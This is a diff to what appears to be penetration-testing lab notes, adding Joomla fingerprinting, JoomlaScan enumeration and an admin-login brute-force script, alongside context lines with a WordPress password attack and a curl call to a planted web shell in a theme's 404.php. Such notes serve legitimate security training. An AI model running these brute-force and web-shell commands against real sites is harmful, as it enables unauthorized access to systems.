@@ -71,6 +71,25 @@ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rocky
 curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
 ```
 
+## joomla
+```bash
+curl -s http://dev.inlanefreight.local/ | grep Joomla
+
+curl -s http://dev.inlanefreight.local/README.txt | head -n 5
+
+curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
+```
+```bash
+git clone https://github.com/drego85/JoomlaScan
+
+python2.7 joomlascan.py -u http://dev.inlanefreight.local
+```
+```bash
+git clone https://github.com/ajnik/joomla-bruteforce
+
+sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
+```
+
 
 </details>
 
